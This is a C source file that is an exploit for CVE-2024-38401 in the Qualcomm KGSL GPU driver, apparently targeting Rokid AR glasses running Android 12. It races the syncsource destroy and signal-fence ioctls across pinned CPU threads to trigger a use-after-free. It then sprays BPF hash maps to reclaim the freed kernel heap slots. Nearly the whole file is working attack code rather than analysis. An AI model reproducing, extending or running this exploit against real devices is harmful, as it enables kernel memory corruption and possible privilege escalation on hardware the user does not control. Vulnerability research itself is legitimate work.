/*
 * CVE-2024-38401 Exploit + BPF Heap Spray (v2 - with CPU Affinity)
 * Target: Rokid AR Glasses (Android 12, Kernel 5.10.209)
 *
 * Strategy:
 * 1. Setup BPF maps of various sizes (SPRAY_MAP_TYPE_HASH) to target different kmalloc caches.
 * 2. CPU Pinning: Racer on CPU 1, Free/Spray on CPU 0 to maximize cache warmth and race window.
 * 3. Run the Race Condition.
 * 4. Verify crash or unexpected behavior.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/bpf.h>

// ---------------------------------------------------------------------------
// KGSL Definitions
// ---------------------------------------------------------------------------

#define KGSL_IOC_TYPE 0x09
#define KGSL_IOCTL_SYNCSOURCE_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x40, struct kgsl_syncsource_create)
#define KGSL_IOCTL_SYNCSOURCE_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x41, struct kgsl_syncsource_destroy)
#define KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE \
    _IOWR(KGSL_IOC_TYPE, 0x42, struct kgsl_syncsource_create_fence)
#define KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE \
    _IOWR(KGSL_IOC_TYPE, 0x43, struct kgsl_syncsource_signal_fence)

struct kgsl_syncsource_create
{
    unsigned int id;
};
struct kgsl_syncsource_destroy
{
    unsigned int id;
};
struct kgsl_syncsource_create_fence
{
    unsigned int id;
    unsigned int fencefd;
};
struct kgsl_syncsource_signal_fence
{
    unsigned int id;
    unsigned int fencefd;
};

// ---------------------------------------------------------------------------
// BPF Definitions & Helpers
// ---------------------------------------------------------------------------

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static inline int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

static int bpf_create_map(int type, int key_size, int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_map(int fd, void *key, void *value, uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

// ---------------------------------------------------------------------------
// Utils
// ---------------------------------------------------------------------------

void set_affinity(int cpu)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) < 0)
    {
        // pervasive error on some androids if restricted, but usually ok for shell user
    }
}

// ---------------------------------------------------------------------------
// Spray Configuration
// ---------------------------------------------------------------------------

#define SPRAY_MAP_COUNT 4
// Target Value Overhead ~40 bytes.
// Targets: 64, 96, 128, 192
// Values: 24, 56, 88, 152
int spray_fds[SPRAY_MAP_COUNT];
int spray_sizes[SPRAY_MAP_COUNT] = {24, 56, 88, 152};
char *payloads[SPRAY_MAP_COUNT];

void setup_spray()
{
    printf("[*] Setting up BPF Spray Maps...\n");
    for (int i = 0; i < SPRAY_MAP_COUNT; i++)
    {
        spray_fds[i] = bpf_create_map(BPF_MAP_TYPE_HASH, sizeof(int), spray_sizes[i], 10000);
        if (spray_fds[i] < 0)
        {
            printf("    [-] Map %d failed creation\n", i);
        }
        else
        {
            // printf("    [+] Map %d created (fd=%d) val_size=%d\n", i, spray_fds[i], spray_sizes[i]);
        }
        payloads[i] = malloc(spray_sizes[i]);
        if (payloads[i])
            memset(payloads[i], 0x41, spray_sizes[i]);
    }
}

volatile int key_counter = 0;

void perform_spray()
{
    int key = __sync_fetch_and_add(&key_counter, 1);
    for (int i = 0; i < SPRAY_MAP_COUNT; i++)
    {
        if (spray_fds[i] >= 0)
            bpf_update_map(spray_fds[i], &key, payloads[i], BPF_NOEXIST);
    }
}

// ---------------------------------------------------------------------------
// Race Logic
// ---------------------------------------------------------------------------

int kgsl_fd;
volatile int stop = 0;
volatile int race_start = 0;

void *racer_signal(void *arg)
{
    set_affinity(1); // Bind to CPU 1 (Execution/Use)
    struct kgsl_syncsource_signal_fence *sig_args = (struct kgsl_syncsource_signal_fence *)arg;

    while (!stop)
    {
        if (race_start)
        {
            // Hammer the signal ioctl
            ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE, sig_args);
        }
    }
    return NULL;
}

void *racer_spray(void *arg)
{
    set_affinity(0); // Bind to CPU 0 (Allocation)
    // Runs alongside the free (which is also on CPU 0 in main thread)

    while (!stop)
    {
        if (race_start)
        {
            // Constant background noise of allocations
            // perform_spray();
            // Actually, we want to time this right after free,
            // so maybe we don't start spraying until instructed?
        }
        // Just yield to let main thread run
        usleep(1);
    }
    return NULL;
}

int main()
{
    set_affinity(0); // Bind Main to CPU 0

    printf("[*] CVE-2024-38401 BPF Spray v2 (Affinity)\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        perror("open");
        return 1;
    }

    setup_spray();

    pthread_t t_sig;

    long iterations = 50000;

    for (long i = 0; i < iterations; i++)
    {
        struct kgsl_syncsource_create create = {0};
        if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE, &create) < 0)
            continue;

        struct kgsl_syncsource_create_fence fence = {0};
        fence.id = create.id;
        if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE, &fence) < 0)
        {
            ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &create);
            continue;
        }

        struct kgsl_syncsource_signal_fence sig_args = {0};
        sig_args.id = create.id;
        sig_args.fencefd = fence.fencefd;

        stop = 0;
        race_start = 0;

        pthread_create(&t_sig, NULL, racer_signal, &sig_args);

        // Setup done, sync threads
        usleep(10); // Let signal thread spin up

        race_start = 1;

        // THE RACE:
        // Thread A (Main): Destroys (Free)
        // Thread B (Signal): Uses
        // Thread A (Main): Immediately Sprays (Reclaim)

        struct kgsl_syncsource_destroy destroy = {0};
        destroy.id = create.id;

        // Critical Section
        ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &destroy);
        perform_spray(); // Try to catch the free slot immediately!

        // Cleanup
        stop = 1;
        pthread_join(t_sig, NULL);
        close(fence.fencefd);

        if (i % 1000 == 0)
        {
            printf("\r[*] Iteration %ld | Keys: %d", i, key_counter);
            fflush(stdout);
        }
    }

    printf("\n[*] Finished.\n");
    close(kgsl_fd);
    return 0;
}
